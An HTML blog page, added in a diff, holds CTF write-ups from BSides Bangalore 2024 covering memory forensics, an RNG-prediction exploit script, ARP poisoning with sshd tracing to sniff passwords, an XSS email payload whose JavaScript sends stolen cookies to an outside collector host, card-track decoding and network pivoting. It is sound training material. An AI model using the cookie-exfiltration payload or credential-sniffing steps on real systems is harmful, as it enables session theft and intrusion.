@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>Bsides Bangalore 2024 :: </title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Forensics: No malware on file Not having access to vol2 or a windows box, I wasted entire time getting vol2 working on arm or windows running. Biggest fault!
+" />
+<meta name="keywords" content="ctf, metactf, bsides" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="http://localhost:1313/ctf-writeups/bsides-bangalore-2024/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="http://localhost:1313/styles.css">
+
+
+
+<link rel="stylesheet" href="http://localhost:1313/style.css">
+
+
+
+  <link rel="shortcut icon" href="http://localhost:1313/favicon.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="https://hritik.sh" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Bsides Bangalore 2024">
+<meta property="og:description" content="Forensics: No malware on file Not having access to vol2 or a windows box, I wasted entire time getting vol2 working on arm or windows running. Biggest fault!
+" />
+<meta property="og:url" content="http://localhost:1313/ctf-writeups/bsides-bangalore-2024/" />
+<meta property="og:site_name" content="" />
+
+  
+    <meta property="og:image" content="http://localhost:1313/favicon.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2024-06-30 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Hritik&#39;s Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/ctf-writeups">Writeups</a></li>
+        
+      
+        
+          <li><a href="https://github.com/hritik14">Github</a></li>
+        
+      
+        
+          <li><a href="/index.xml">RSS</a></li>
+        
+      
+        
+          <li><a href="/cheatsheets">Cheatsheets</a></li>
+        
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="mailto:ping@hritik.sh">Contact</a></li>
+        
+      
+        
+          <li><a href="https://www.linkedin.com/in/hritikvijay/">LinkedIn</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/ctf-writeups" >Writeups</a></li>
+        
+      
+        
+          <li><a href="https://github.com/hritik14" >Github</a></li>
+        
+      
+        
+          <li><a href="/index.xml" >RSS</a></li>
+        
+      
+      
+        <li>
+          <ul class="menu">
+            <li class="menu__trigger">Show more&nbsp;▾</li>
+            <li>
+              <ul class="menu__dropdown">
+                
+                  
+                    <li><a href="/cheatsheets" >Cheatsheets</a></li>
+                  
+                
+                  
+                    <li><a href="/about" >About</a></li>
+                  
+                
+                  
+                    <li><a href="mailto:ping@hritik.sh" >Contact</a></li>
+                  
+                
+                  
+                    <li><a href="https://www.linkedin.com/in/hritikvijay/" >LinkedIn</a></li>
+                  
+                
+              </ul>
+            </li>
+          </ul>
+        </li>
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/ctf-writeups/bsides-bangalore-2024/">Bsides Bangalore 2024</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2024-06-30</time></div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="forensics-no-malware-on-file">Forensics: No malware on file<a href="#forensics-no-malware-on-file" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Not having access to vol2 or a windows box, I wasted entire time getting vol2 working on arm or windows running. Biggest fault!</p>
+<p>Better way (after CTF endend): With calm mind,</p>
+<ul>
+<li>I started working with vol3 natively.</li>
+<li>Spinned up lima vm with rosetta support and used vol2&rsquo;s release binaries for amd64</li>
+</ul>
+<h2 id="working-with-vol3">Working with vol3<a href="#working-with-vol3" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>What I did:
+Dumped all registries -&gt; didn&rsquo;t find anything -&gt; moved to printkey registries</p>
+<p>The Good:</p>
+<ul>
+<li>Dumped all registries</li>
+</ul>
+<p>The Bad:</p>
+<ul>
+<li>Opened only one hive in vim</li>
+<li>Did not look for embedded magic bytes in all hives</li>
+<li>Did not run binwalk on dumped registries</li>
+<li>Did not follow up on registries</li>
+</ul>
+<p>Printkey &ndash;recurse is somehow different than hivelist &ndash;dump.<br>
+Binwalk does not extract all detected. Give <code>-D '.*'</code> to extract all</p>
+<h3 id="tldr">tl;dr<a href="#tldr" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<ol>
+<li>vol -f image.vmem -o dump windows.registry.hivelist &ndash;dump</li>
+<li>binwalk -y exe dump/* | grep -B 6 PE</li>
+<li>binwalk -e -D &lsquo;.*&rsquo; registry.SOFTWARE.0xf8a0010f2410.hive</li>
+<li>Upload found exe to virustotal or any.run or run in windows</li>
+<li>grep for MetaCTF{</li>
+</ol>
+<p>See my <a href="/cheatsheets/volatality/">cheatsheet</a>.</p>
+<h1 id="crypto-twist-and-shout">Crypto: Twist and Shout<a href="#crypto-twist-and-shout" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>This is based on the fact that python&rsquo;s rand function is predictable/calculable when you have enough inputs.<br>
+It uses Mersenne Twister whose entire state can be calculated with 624 consecutive inputs
+but we don&rsquo;t have access to consecutive inputs here.</p>
+<p>It turns out, we don&rsquo;t need the entire state either.
+Only need 2 random numbers to predict.<br>
+See: <a href="https://github.com/deut-erium/RNGeesus/blob/main/src/code_mersenne/mersenne.py">https://github.com/deut-erium/RNGeesus/blob/main/src/code_mersenne/mersenne.py</a> : get_ith</p>
+<blockquote>
+<p>Get i&rsquo;th output given i-624, i-623 and i-227 th inputs<br>
+if <code>both=True</code> then can be <em>only i-623 and i-227</em> only as<br>
+we only need MSB of i-624 which can be two possibilities</p></blockquote>
+<p>Server gives every alternate random number, so keep the offsets accordingly.</p>
+<pre class="language-python"><code>from pwn import *
+import base64
+import gessus
+
+
+host = &#39;icc.metaproblems.com&#39;
+port = 5600
+conn = remote(host, port)
+
+def generate_ticket(n):
+    return str(base64.b16encode(int.to_bytes(n, 4, &#39;little&#39;)))[2:-1]
+
+def ticket_to_bits(ticket: str):
+    byts = base64.b16decode(ticket)
+    return int.from_bytes(byts, &#39;little&#39;)
+    
+
+predictors = []
+
+def main():
+    conn.recvuntil(b&#34;casino!\n&#34;)
+    iter = 0
+    while True:
+        iter &#43;= 1
+
+        conn.recvuntil(b&#34;Would you like to play the random lotto (our only game)? Y/n\n&#34;)
+        conn.sendline(b&#34;y&#34;)
+
+        conn.recvuntil(b&#34;tickets remaining\n&#34;)
+        line = conn.recvline()
+        num = line.split()[2].decode()
+
+
+        target = 312
+
+        if iter == 1 or iter == 199:
+            predictors.append(ticket_to_bits(num))
+
+        if iter == target:
+            answers = gessus.BreakerPy().get_ith(predictors, both=True)
+            answer = generate_ticket(answers[0])
+            print(&#34;sending answer&#34;, answer)
+            conn.sendline(answer)
+            # Check if we guessed correctly
+            response = conn.recvline().decode()
+            if &#34;quite lucky&#34; in response:
+                print(f&#34;Flag obtained: {response}&#34;)
+            else:
+                print(&#34;failed&#34;)
+                print (response)
+                response = conn.recvline().decode()
+                print (response)
+                response = conn.recvline().decode()
+                print (response)
+                break
+        else:
+            conn.sendline()
+            print(f&#34;iteration nnumber {iter} with {num} {ticket_to_bits(num)}&#34;)
+            conn.recvuntil(b&#34;Checking&#34;)
+            conn.recvline()
+
+
+if __name__ == &#34;__main__&#34;:
+    main()</code></pre><h1 id="network-troublesome-tofu">Network: Troublesome Tofu<a href="#network-troublesome-tofu" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>It shouts arp poisoining from the desc of challenge. <code>arpscan</code> is present is a huge indicator.
+To be certain, diff all items in <code>$PATH</code> to a fresh ubuntu install.</p>
+<ul>
+<li>Target: 192.168.0.2 (ssh)</li>
+<li>Victim: 192.168.0.50 (contantly ssh-ing to Target with password auth)</li>
+<li>Attacker: 192.168.0.99</li>
+</ul>
+<ol>
+<li>ARP poison</li>
+<li>Ensure getting traffic by tcpdump3</li>
+<li>!! traffic has a different dst ip, your own kernel will not pick them up. Change your IP to target&rsquo;s IP. <code>ip addr add 192.168.0.2 dev eth0</code></li>
+<li><code>which sshd</code>, then run sshd, error about dir not present, create that dir</li>
+<li><code>./strace -s 4096 /path/to/sshd &gt; logs</code></li>
+<li>Wait (or monitor netstat for login attempt)</li>
+<li><code>awk 'NF &lt; 5' | logs</code> or look for read syscalls.</li>
+<li>Get the password and login to target (reset your ip first).</li>
+</ol>
+<h1 id="cookie-jar">Cookie Jar<a href="#cookie-jar" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ol>
+<li>XSS is in email. &ldquo;&lt;script/src=&lsquo;mysite.js&rsquo;&gt;</script>&quot;@wahtever.com</li>
+<li>Get URL, send to admin</li>
+<li>run fetch from admin to get cookies.php and send to your site</li>
+</ol>
+<pre class="language-javascript"><code>cook = fetch(&#39;/cookies.php&#39;)
+	.then((response) =&gt; response.text())
+	.then( (text) =&gt; {
+	fetch(&#39;http://pxqfydd099x1249owsa7yft5dwjn7fv4.oastify.com&#39;, {
+		method: &#34;POST&#34;,
+		body: &#34;ok&#34; &#43; &#34;\n&#34; &#43; text
+	})
+})</code></pre><h1 id="magnetic-pull">Magnetic Pull<a href="#magnetic-pull" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Liked the challenge although found out in the end that could&rsquo;ve used some chatgpt plugin app for this. Anyway.</p>
+<blockquote>
+<p>Our credit card skimmer yanked this Track 1 data off of an unsuspecting victim, but we&rsquo;re not really sure how to decode it. Can you get their name?</p>
+<p>A28CACC8A34AE41B512F54B16A34EA55F5BA45A1E22CCBCE7ED283D24CEFD67ED283CA77CC08102F82544B522C58A1020409152E4081027C6E</p></blockquote>
+<ol>
+<li>Read Wikipedia about <a href="https://en.wikipedia.org/wiki/Digital_card#Track_1">https://en.wikipedia.org/wiki/Digital_card#Track_1</a></li>
+<li>Read <a href="https://en.wikipedia.org/wiki/Six-bit_character_code#DEC_six-bit_code">https://en.wikipedia.org/wiki/Six-bit_character_code#DEC_six-bit_code</a></li>
+<li>Decode (take care of endianness)</li>
+</ol>
+<pre class="language-python"><code>def _chr(num):
+    assert num &gt;= 0 and num &lt;= 63
+    return chr(num&#43;32)
+
+def __chr(num):
+    if num &gt;= 32 and num &lt;=63:
+        return chr(num)
+    if num &gt; 63:
+        return chr(num - 64)
+    return &#34;&#34;
+
+def bcd(x):
+    if x &gt;= 0x1 and x &lt; 0xA:
+        return chr(x - 0x1 &#43; ord(&#39;1&#39;))
+    if x &gt;= 0x12 and x &lt;= 0x19:
+        return chr(x - 0x12 &#43; ord(&#39;S&#39;))
+    if x &gt;= 0x21 and x &lt;= 0x29:
+        return chr(x - 0x21 &#43; ord(&#39;J&#39;))
+    if x &gt;= 0x31 and x &lt;= 0x39:
+        return chr(x - 0x31 &#43; ord(&#39;A&#39;))
+
+    return &#39;.&#39;
+
+def parity(x):
+    res = 0
+    while x:
+        res ^= x &amp; 1
+        x &gt;&gt;=1
+    return res
+
+def parity_check(bin_data):
+    for i in range(0, len(bin_data)-1, 7):
+        seven_bit_chunk = bin_data[i:i&#43;7]
+        parity_sign = parity(int(seven_bit_chunk, 2))
+        if parity_sign:
+            print(&#34;.&#34;, end=&#34;&#34;)
+        else:
+            print(&#34;x&#34;, end=&#34;&#34;)
+            #f&#34;{parity_sign} == {parity(data)}&#34;
+    print(&#34;Parity check complete&#34;)
+
+def bin_to_ascii(bin_data):
+    for i in range(0, len(bin_data)-1, 7):
+        seven_bit_chunk = bin_data[i:i&#43;7]
+        seven_bit_chunk = seven_bit_chunk[::-1] # Endianness !!!
+        data = int(seven_bit_chunk[1:7], 2)
+        parity_bit = seven_bit_chunk[0:1]
+        parity_sign = int(parity_bit, 2)
+        if parity_sign != parity(data):
+            print(_chr(data), end=&#34;&#34;)
+        else:
+            print(&#34;x&#34;, end=&#34;&#34;)
+    print()
+
+
+hex_data = &#34;A28CACC8A34AE41B512F54B16A34EA55F5BA45A1E22CCBCE7ED283D24CEFD67ED283CA77CC08102F82544B522C58A1020409152E4081027C6E&#34;
+bin_data = hex_to_bin(hex_data)
+parity_check(bin_data)
+bin_to_ascii(bin_data)</code></pre><h1 id="network-lost-in-the-woods">Network: Lost in the woods<a href="#network-lost-in-the-woods" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<blockquote>
+<p>Nothing but trees and boxen, as far as the eye can see.</p>
+<p>Connect with ssh -p 7001 <a href="mailto:ctf-86cc68f29a7a@ssh.dyn.mctf.io">ctf-86cc68f29a7a@ssh.dyn.mctf.io</a></p>
+<p>See if you can find a box with an open port and go from there!</p></blockquote>
+<p>Port scan</p>
+<pre class="language-text"><code>/ # nmap 192.168.0.1/24 --open
+PORT     STATE SERVICE
+8000/tcp open  http-alt
+MAC Address: 02:42:0A:01:39:02 (Unknown)</code></pre><p>Login Attempt</p>
+<pre class="language-text"><code>/ # curl 192.168.0.45:8000
+curl: (1) Received HTTP/0.9 when not allowed
+
+/ # nc 192.168.0.45 8000
+SSH-2.0-OpenSSH_9.6
+^C
+
+/ # ssh 192.168.0.45 -p 8000
+###########
+
+You found me! That&#39;s PART 1 of 3 completed.
+
+There is nothing more of use on this IP address (the SSH is just to
+  show you this banner, you can&#39;t log in). Continue onwards.
+  The next machine is at 192.168.0.59
+
+You&#39;ll need these credentials:
+Username: admin
+Password: prettypleaseletmein
+
+Hint: Remember to look all over.
+Also, from now on, use the T5 flag to save yourself time, it shouldn&#39;t hurt anything.
+
+###########</code></pre><p>nmap -p- -T5 192.168.0.59 and get port 43254</p>
+<pre class="language-text"><code>/ # curl -u admin:prettypleaseletmein 192.168.0.59:43254
+
+You found me! That&#39;s PART 2 of 3 completed.
+
+Continue onwards.
+Your final machine is at 192.168.0.132, port number 10.
+
+Hint: Ogres have layers, and so do protocol suites. Check them all.
+If you&#39;d like an additional hint, it&#39;s on this webserver.</code></pre><p>Why leave the hint</p>
+<pre class="language-text"><code>/ # curl -u admin:prettypleaseletmein 192.168.0.59:43254/hint
+It&#39;s not UDP.</code></pre><p>Get the flag</p>
+<pre class="language-text"><code># nmap 192.168.0.132 -sO -T5
+132      open   sctp
+# ncat --sctp 192.168.0.132 10</code></pre>
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
